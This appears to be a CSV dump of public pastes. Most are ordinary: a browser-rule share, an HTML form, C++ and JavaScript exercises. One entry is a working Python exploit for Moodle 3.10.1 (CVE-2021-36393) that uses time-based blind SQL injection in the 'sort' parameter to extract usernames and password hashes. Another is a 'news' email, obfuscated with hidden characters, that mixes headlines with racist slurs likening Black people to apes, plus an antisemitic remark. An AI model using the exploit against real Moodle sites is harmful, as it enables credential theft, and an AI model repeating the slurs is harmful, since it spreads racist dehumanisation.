id,title,username,language,date,content
vZMMsX73,邀您一起看：2024年2月推荐,xiaomianao666,JavaScript,Saturday 13th of April 2024 12:13:21 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥2024年2月推荐@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5aWH5aaZ5bel5YW3566xXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHBzOi8vaGFpa3Vvc2hpamllLmNuL2FyY2hpdmVzLzIwMjRuaWFuLTJ5dWUtdHVpLWppYW5cXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwi5bel5YW3XCIsXCJwYWdlc1wiOlwiW11cIn0iLCJ0aXRsZSI6IjIwMjTlubQy5pyI5o6o6I2QIn0=
e0DTAWpQ,Loginhtml,GZTEAM,HTML,Saturday 13th of April 2024 12:08:18 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Crear Nuevo Usuario</title>
    <link rel=""stylesheet"" href=""styles.css""> <!-- Agregar esta línea para vincular el archivo CSS externo -->
</head>
<body>
    <h1>Create username : </h1>
    <form action=""/login"" method=""post"">
        <input type=""text"" name=""username"" required />
        <button type=""submit"">Crear usuario</button>
    </form>
</body>
</html>
"
svqBSQv8,Untitled,35657,C++,Friday 12th of April 2024 11:52:41 PM CDT,"#include <iostream> 

using namespace std;

void print(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

void fill(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        arr[i] = rand() % 10;
    }
}

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    int size, type;

    cout << ""Введите размер массива: "";
    cin >> size;
    
    cout << ""Введите 0 для удаления четных элементов, 1 для удаления нечетных элементов: "";
    cin >> type;

    int* arr = new int[size];

    fill(arr, size);
    print(arr, size);

    int temp_size = size % 2 != 0 && type == 0 ? size / 2 + 1 : size / 2;

    int* temp = new int[temp_size];

    for (int i = type, k = 0; i < size; i += 2, k++) {
        temp[k] = arr[i];
    }

    delete[] arr;

    arr = temp;

    size = temp_size;

    print(arr, size);

    delete[] temp;
}"
StHYZu5x,2.Expense Tracker,Silviya7,JavaScript,Friday 12th of April 2024 11:23:18 PM CDT,"
function solve(){
    const ElementExpense=document.getElementById('expense');
    const Elementamount=document.getElementById('amount');
    const Elementdate=document.getElementById('date');
    const BtnAdd=document.getElementById('add-btn');
    const elementUl= document.getElementById('preview-list');
    const expenseElement= document.getElementById('expenses-list');
    const BtnDelete= document.querySelector('.btn.delete');
    

    BtnDelete.addEventListener('click',()=>{
        expenseElement.innerHTML='';
    });

    BtnAdd.addEventListener('click',()=>{
       /* console.log(ElementExpense.value);
        console.log(Elementamount.value);
        console.log(Elementdate.value);*/
    
        if(!ElementExpense.value || !Elementamount.value || !Elementdate.value){
           return;
        }
       
        let firstp=document.createElement('p');
    
        firstp.textContent=`Type: ${ElementExpense.value}`;
        let secondp=document.createElement('p');
        secondp.textContent=`Amount: ${Elementamount.value}$`;
        let thirdp=document.createElement('p');
        thirdp.textContent=`Date: ${Elementdate.value}`;
    
        const ElementArticle= document.createElement('article');
        ElementArticle.appendChild(firstp);
        ElementArticle.appendChild(secondp);
        ElementArticle.appendChild(thirdp);
    
        const Elementli=document.createElement('li');   
        const DivBtns= document.createElement('div');
        DivBtns.classList.add('buttons');
        const btnedit=document.createElement('button');
        const btnok=document.createElement('button');
    
        btnedit.classList.add('btn','edit');
        btnedit.textContent='EDIT';
        btnok.classList.add('btn','ok');
        btnok.textContent='OK';
    
        DivBtns.appendChild(btnedit);
        DivBtns.appendChild(btnok);
        Elementli.classList.add('expense-item');
    
        Elementli.appendChild(ElementArticle);
        elementUl.appendChild(Elementli);
        Elementli.appendChild(DivBtns);
        
         ElementExpense.value='';
         Elementamount.value='';
         Elementdate.value='';
         BtnAdd.setAttribute('disabled','disabled');      

        btnedit.addEventListener('click',()=>{
           let ListNodes= document.querySelectorAll('article p');
           let AllList=Array.from(ListNodes);

           ElementExpense.value=AllList[0].textContent.substring(6);
           Elementamount.value=AllList[1].textContent.substring(8,AllList[1].textContent.length-1);
           Elementdate.value=AllList[2].textContent.substring(6);
           Elementli.remove();
           BtnAdd.removeAttribute('disabled');
        });

        btnok.addEventListener('click',()=>{         
            
            expenseElement.appendChild(Elementli);
            DivBtns.remove();
            BtnAdd.removeAttribute('disabled');
        });
       
});
}"
PH0ZarRP,"Moodle 3.10.1 - Authenticated Blind Time-Based SQL Injection - ""sort"" parameter",FlyFar,Python,Friday 12th of April 2024 10:38:13 PM CDT,"# Exploit Title: Moodle Authenticated Time-Based Blind SQL Injection - ""sort"" Parameter
# Google Dork: 
# Date: 04/11/2023
# Exploit Author: Julio Ángel Ferrari (Aka. T0X1Cx)
# Vendor Homepage: https://moodle.org/
# Software Link: 
# Version: 3.10.1
# Tested on: Linux
# CVE : CVE-2021-36393

import requests
import string
from termcolor import colored

# Request details
URL = ""http://127.0.0.1:8080/moodle/lib/ajax/service.php?sesskey=ZT0E6J0xWe&info=core_course_get_enrolled_courses_by_timeline_classification""
HEADERS = {
    ""Accept"": ""application/json, text/javascript, */*; q=0.01"",
    ""Content-Type"": ""application/json"",
    ""X-Requested-With"": ""XMLHttpRequest"",
    ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36"",
    ""Origin"": ""http://127.0.0.1:8080"",
    ""Referer"": ""http://127.0.0.1:8080/moodle/my/"",
    ""Accept-Encoding"": ""gzip, deflate"",
    ""Accept-Language"": ""en-US,en;q=0.9"",
    ""Cookie"": ""MoodleSession=5b1rk2pfdpbcq2i5hmmern1os0"",
    ""Connection"": ""close""
}

# Characters to test
characters_to_test = string.ascii_lowercase + string.ascii_uppercase + string.digits + ""!@#$^&*()-_=+[]{}|;:'\"",.<>?/""

def test_character(payload):
    response = requests.post(URL, headers=HEADERS, json=[payload])
    return response.elapsed.total_seconds() >= 3

def extract_value(column, label):
    base_payload = {
        ""index"": 0,
        ""methodname"": ""core_course_get_enrolled_courses_by_timeline_classification"",
        ""args"": {
            ""offset"": 0,
            ""limit"": 0,
            ""classification"": ""all"",
            ""sort"": """",
            ""customfieldname"": """",
            ""customfieldvalue"": """"
        }
    }

    result = """"
    for _ in range(50):  # Assumes a maximum of 50 characters for the value
        character_found = False
        for character in characters_to_test:
            if column == ""database()"":
                base_payload[""args""][""sort""] = f""fullname OR (database()) LIKE '{result + character}%' AND SLEEP(3)""
            else:
                base_payload[""args""][""sort""] = f""fullname OR (SELECT {column} FROM mdl_user LIMIT 1 OFFSET 0) LIKE '{result + character}%' AND SLEEP(3)""
            
            if test_character(base_payload):
                result += character
                print(colored(f""{label}: {result}"", 'red'), end=""\r"")
                character_found = True
                break

        if not character_found:
            break

    # Print the final result
    print(colored(f""{label}: {result}"", 'red'))

if __name__ == ""__main__"":
    extract_value(""database()"", ""Database"")
    extract_value(""username"", ""Username"")
    extract_value(""password"", ""Password"")
            "
Hy7Kmz6Q,News April12 24,Newscaster_Ned,Email,Friday 12th of April 2024 10:29:14 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

W‎e‎l‎l‎ ‎n‎o‎ ‎m‎o‎r‎e‎ ‎J‎u‎i‎c‎e‎.‎ ‎I‎ ‎w‎i‎s‎h‎ ‎I‎ ‎s‎a‎i‎d‎ ‎J‎e‎w‎s‎.‎

C‎u‎e‎l‎l‎a‎r‎:‎ ‎B‎i‎d‎e‎n‎ ‎C‎a‎n‎ ‎A‎c‎t‎ ‎U‎n‎i‎l‎a‎t‎e‎r‎a‎l‎l‎y‎ ‎o‎n‎ ‎B‎o‎r‎d‎e‎r‎,‎ ‎H‎e‎ ‎S‎h‎o‎u‎l‎d‎ ‎D‎o‎ ‎W‎h‎a‎t‎ ‎O‎b‎a‎m‎a‎ ‎D‎i‎d‎
N‎i‎g‎e‎r‎i‎a‎n‎ ‎B‎r‎o‎t‎h‎e‎r‎s‎ ‎P‎l‎e‎a‎d‎ ‎G‎u‎i‎l‎t‎y‎ ‎t‎o‎ ‎S‎e‎x‎t‎o‎r‎t‎i‎n‎g‎ ‎T‎e‎e‎n‎ ‎W‎h‎o‎ ‎C‎o‎m‎m‎i‎t‎t‎e‎d‎ ‎S‎u‎i‎c‎i‎d‎e‎
M‎a‎n‎c‎h‎i‎n‎:‎ ‎B‎i‎d‎e‎n‎ ‎'‎N‎e‎e‎d‎s‎ ‎t‎o‎ ‎M‎o‎v‎e‎'‎ ‎t‎o‎ ‎G‎e‎t‎ ‎M‎y‎ ‎S‎u‎p‎p‎o‎r‎t‎,‎ ‎H‎e‎ ‎N‎e‎e‎d‎s‎ ‎t‎o‎ ‎A‎c‎t‎ ‎o‎n‎ ‎B‎o‎r‎d‎e‎r‎
M‎a‎n‎c‎h‎i‎n‎:‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎B‎e‎e‎n‎ ‎P‎u‎s‎h‎e‎d‎ ‎t‎o‎ ‎'‎T‎o‎o‎ ‎F‎a‎r‎ ‎L‎e‎f‎t‎'‎ ‎P‎o‎s‎i‎t‎i‎o‎n‎s‎ ‎H‎e‎ ‎D‎o‎e‎s‎n‎'‎t‎ ‎B‎e‎l‎i‎e‎v‎e‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
G‎O‎P‎ ‎W‎T‎F‎:‎ ‎E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎V‎o‎t‎e‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎

‘‎S‎a‎d‎ ‎D‎a‎y‎ ‎f‎o‎r‎ ‎A‎m‎e‎r‎i‎c‎a‎’‎
S‎p‎e‎a‎k‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎H‎o‎u‎s‎e‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎,‎ ‎R‎-‎L‎a‎.‎,‎ ‎w‎a‎i‎t‎s‎ ‎t‎o‎ ‎r‎a‎i‎s‎e‎ ‎t‎h‎e‎ ‎g‎a‎v‎e‎l‎ ‎t‎o‎ ‎f‎o‎r‎m‎a‎l‎l‎y‎ ‎c‎o‎n‎c‎l‎u‎d‎e‎ ‎a‎
E‎i‎g‎h‎t‎y‎-‎s‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎o‎n‎ ‎F‎r‎i‎d‎a‎y‎ ‎v‎o‎t‎e‎d‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎a‎n‎ ‎a‎m‎e‎n‎d‎m‎e‎n‎t‎ ‎t‎o‎ ‎r‎e‎q‎u‎i‎r‎e‎ ‎a‎ ‎w‎a‎r‎r‎a‎n‎t‎ ‎f‎o‎r‎ ‎s‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎’‎ ‎c‎o‎m‎m‎u‎n‎i‎c‎a‎t‎i‎o‎n‎s‎.‎

E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎V‎o‎t‎e‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎
E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎
5‎,‎8‎7‎8‎
B‎i‎d‎e‎n‎’‎s‎ ‎C‎a‎t‎c‎h‎ ‎a‎n‎d‎ ‎R‎e‎l‎e‎a‎s‎e‎:‎ ‎A‎f‎g‎h‎a‎n‎ ‎M‎i‎g‎r‎a‎n‎t‎ ‎o‎n‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎W‎a‎t‎c‎h‎l‎i‎s‎t‎ ‎T‎w‎i‎c‎e‎ ‎F‎r‎e‎e‎d‎ ‎i‎n‎t‎o‎ ‎U‎.‎S‎.‎
C‎a‎t‎c‎h‎ ‎a‎n‎d‎ ‎R‎e‎l‎e‎a‎s‎e‎:‎ ‎A‎f‎g‎h‎a‎n‎ ‎o‎n‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎W‎a‎t‎c‎h‎l‎i‎s‎t‎ ‎T‎w‎i‎c‎e‎ ‎F‎r‎e‎e‎d‎ ‎i‎n‎t‎o‎ ‎U‎.‎S‎.‎
9‎1‎6‎
U‎.‎S‎.‎ ‎F‎e‎a‎r‎s‎ ‎I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎s‎r‎a‎e‎l‎;‎ ‎T‎e‎l‎l‎s‎ ‎D‎i‎p‎l‎o‎m‎a‎t‎i‎c‎ ‎S‎t‎a‎f‎f‎ ‎N‎o‎t‎ ‎t‎o‎ ‎T‎r‎a‎v‎e‎l‎
U‎.‎S‎.‎ ‎F‎e‎a‎r‎s‎ ‎I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎s‎r‎a‎e‎l‎;‎ ‎T‎e‎l‎l‎s‎ ‎D‎i‎p‎l‎o‎m‎a‎t‎i‎c‎ ‎S‎t‎a‎f‎f‎ ‎N‎o‎t‎ ‎t‎o‎ ‎T‎r‎a‎v‎e‎l‎
4‎,‎7‎0‎8‎
V‎I‎D‎E‎O‎ ‎–‎ ‎‘‎H‎o‎r‎r‎e‎n‎d‎o‎u‎s‎’‎:‎ ‎N‎Y‎C‎ ‎1‎6‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎w‎i‎t‎h‎ ‎R‎a‎p‎ ‎S‎h‎e‎e‎t‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎h‎o‎v‎i‎n‎g‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎a‎n‎
V‎I‎D‎E‎O‎:‎ ‎N‎Y‎C‎ ‎T‎e‎e‎n‎ ‎w‎i‎t‎h‎ ‎R‎a‎p‎ ‎S‎h‎e‎e‎t‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎h‎o‎v‎i‎n‎g‎ ‎W‎o‎m‎a‎n‎ ‎D‎o‎w‎n‎ ‎C‎h‎u‎r‎c‎h‎ ‎S‎t‎e‎p‎s‎
1‎6‎6‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎,‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎I‎n‎t‎e‎g‎r‎i‎t‎y‎ ‎B‎i‎l‎l‎:‎ ‎‘‎C‎o‎m‎m‎o‎n‎ ‎S‎e‎n‎s‎e‎’‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎,‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎I‎n‎t‎e‎g‎r‎i‎t‎y‎ ‎B‎i‎l‎l‎
1‎6‎4‎
‘‎R‎e‎a‎c‎h‎e‎r‎’‎ ‎S‎t‎a‎r‎ ‎A‎l‎a‎n‎ ‎R‎i‎t‎c‎h‎s‎o‎n‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎W‎h‎o‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎‘‎R‎a‎p‎i‎s‎t‎’‎ ‎T‎r‎u‎m‎p‎:‎
A‎l‎a‎n‎ ‎R‎i‎t‎c‎h‎s‎o‎n‎ ‎B‎l‎a‎s‎t‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎W‎h‎o‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎'‎R‎a‎p‎i‎s‎t‎'‎ ‎T‎r‎u‎m‎p‎
4‎,‎4‎2‎8‎
T‎r‎u‎m‎p‎ ‎F‎l‎a‎n‎k‎e‎d‎ ‎b‎y‎ ‎J‎o‎h‎n‎s‎o‎n‎:‎ ‎‘‎I‎’‎m‎ ‎N‎o‎t‎ ‎a‎ ‎B‎i‎g‎ ‎F‎a‎n‎ ‎o‎f‎ ‎F‎I‎S‎A‎;‎ ‎I‎ ‎T‎h‎i‎n‎k‎ ‎I‎t‎’‎s‎ ‎T‎e‎r‎r‎i‎b‎l‎e‎’‎
T‎r‎u‎m‎p‎:‎ ‎‘‎I‎’‎m‎ ‎N‎o‎t‎ ‎a‎ ‎B‎i‎g‎ ‎F‎a‎n‎ ‎o‎f‎ ‎F‎I‎S‎A‎;‎ ‎I‎ ‎T‎h‎i‎n‎k‎ ‎I‎t‎'‎s‎ ‎T‎e‎r‎r‎i‎b‎l‎e‎'‎
1‎7‎9‎
G‎o‎v‎.‎ ‎H‎o‎b‎b‎s‎:‎ ‎‘‎A‎r‎i‎z‎o‎n‎a‎ ‎W‎o‎m‎e‎n‎ ‎W‎i‎l‎l‎ ‎D‎i‎e‎’‎ ‎U‎n‎d‎e‎r‎ ‎S‎t‎a‎t‎e‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎B‎a‎n‎
G‎o‎v‎.‎ ‎H‎o‎b‎b‎s‎:‎ ‎'‎A‎r‎i‎z‎o‎n‎a‎ ‎W‎o‎m‎e‎n‎ ‎W‎i‎l‎l‎ ‎D‎i‎e‎ ‎U‎n‎d‎e‎r‎ ‎t‎h‎i‎s‎ ‎B‎a‎n‎,‎'‎ ‎I‎t‎ ‎S‎h‎o‎u‎l‎d‎ ‎B‎e‎ ‎R‎e‎p‎e‎a‎l‎e‎d‎
2‎8‎0‎
C‎h‎a‎s‎t‎e‎n‎ ‎B‎u‎t‎t‎i‎g‎i‎e‎g‎:‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎A‎r‎e‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎S‎u‎i‎c‎i‎d‎a‎l‎ ‎L‎G‎B‎T‎Q‎ ‎P‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎‘‎P‎u‎l‎l‎ ‎t‎h‎e‎ ‎T‎r‎i‎g‎g‎e‎r‎’‎
C‎h‎a‎s‎t‎e‎n‎ ‎B‎u‎t‎t‎i‎g‎i‎e‎g‎:‎ ‎G‎O‎P‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎S‎u‎i‎c‎i‎d‎a‎l‎ ‎L‎G‎B‎T‎Q‎ ‎P‎e‎o‎p‎l‎e‎ ‎'‎P‎u‎l‎l‎ ‎t‎h‎e‎ ‎T‎r‎i‎g‎g‎e‎r‎'‎
2‎0‎5‎
A‎P‎ ‎W‎i‎r‎e‎:‎ ‎‘‎A‎ ‎H‎e‎a‎l‎t‎h‎y‎ ‎U‎.‎S‎.‎ ‎E‎c‎o‎n‎o‎m‎y‎’‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎I‎n‎g‎r‎e‎d‎i‎e‎n‎t‎?‎ ‎I‎m‎m‎i‎g‎r‎a‎n‎t‎ ‎W‎o‎r‎k‎e‎r‎s‎,‎ ‎E‎a‎g‎e‎r‎ ‎t‎o‎ ‎F‎i‎l‎l‎ ‎J‎o‎b‎s‎
A‎P‎ ‎W‎i‎r‎e‎:‎ ‎‘‎A‎ ‎H‎e‎a‎l‎t‎h‎y‎ ‎U‎.‎S‎.‎ ‎E‎c‎o‎n‎o‎m‎y‎’‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎I‎n‎g‎r‎e‎d‎i‎e‎n‎t‎?‎ ‎I‎m‎m‎i‎g‎r‎a‎n‎t‎ ‎W‎o‎r‎k‎e‎r‎s‎,‎ ‎E‎a‎g‎e‎r‎ ‎t‎o‎ ‎F‎i‎l‎l‎ ‎J‎o‎b‎s‎’‎

F‎l‎o‎r‎i‎d‎a‎:‎ ‎S‎h‎e‎b‎o‎o‎n‎ ‎S‎h‎o‎o‎t‎s‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎P‎e‎o‎p‎l‎e‎ ‎D‎u‎r‎i‎n‎g‎ ‎S‎o‎l‎a‎r‎ ‎E‎c‎l‎i‎p‎s‎e‎ ‎B‎e‎c‎a‎u‎s‎e‎,‎ ‎""‎G‎o‎d‎ ‎t‎o‎l‎d‎ ‎h‎e‎r‎ ‎t‎o‎ ‎d‎o‎ ‎i‎t‎""‎.‎

N‎e‎g‎r‎o‎e‎s‎ ‎a‎l‎w‎a‎y‎s‎ ‎f‎r‎e‎a‎k‎ ‎o‎u‎t‎ ‎w‎h‎e‎n‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎h‎a‎p‎p‎e‎n‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎o‎n‎'‎t‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎.‎


F‎e‎m‎a‎l‎e‎ ‎B‎a‎b‎o‎o‎n‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎F‎a‎t‎a‎l‎l‎y‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎S‎E‎P‎T‎A‎ ‎D‎r‎i‎v‎e‎r‎.‎


D‎a‎l‎l‎a‎s‎ ‎C‎o‎u‎n‎t‎y‎:‎ ‎2‎ ‎B‎a‎l‎l‎s‎ ‎o‎f‎ ‎P‎u‎b‎e‎s‎ ‎w‎i‎t‎h‎ ‎N‎e‎g‎r‎o‎e‎s‎ ‎U‎n‎d‎e‎r‎ ‎T‎h‎e‎m‎ ‎G‎e‎t‎ ‎3‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎S‎m‎u‎g‎g‎l‎i‎n‎g‎ ‎F‎e‎n‎t‎a‎n‎y‎l‎.‎


N‎u‎n‎c‎h‎u‎c‎k‎-‎W‎i‎e‎l‎d‎i‎n‎g‎ ‎M‎o‎n‎k‎e‎y‎ ‎F‎r‎e‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎A‎t‎t‎a‎c‎k‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎o‎n‎ ‎N‎Y‎C‎ ‎S‎u‎b‎w‎a‎y‎.‎


S‎u‎r‎v‎i‎v‎o‎r‎s‎ ‎T‎e‎s‎t‎i‎f‎y‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎C‎h‎i‎m‎p‎ ‎W‎h‎o‎ ‎S‎h‎o‎t‎ ‎u‎p‎ ‎G‎r‎e‎y‎h‎o‎u‎n‎d‎ ‎B‎u‎s‎ ‎i‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎2‎°‎
/‎5‎7‎°‎
2‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎2‎ ‎|‎ ‎D‎a‎y‎
8‎2‎°‎
2‎%‎
S‎S‎E‎
1‎2‎
 ‎
m‎p‎h‎
A‎ ‎m‎i‎x‎ ‎o‎f‎ ‎c‎l‎o‎u‎d‎s‎ ‎a‎n‎d‎ ‎s‎u‎n‎.‎ ‎H‎i‎g‎h‎ ‎8‎2‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
5‎6‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
9‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎6‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎5‎ ‎p‎m‎
F‎r‎i‎ ‎1‎2‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎7‎°‎
9‎%‎
S‎S‎E‎
1‎1‎
 ‎
m‎p‎h‎
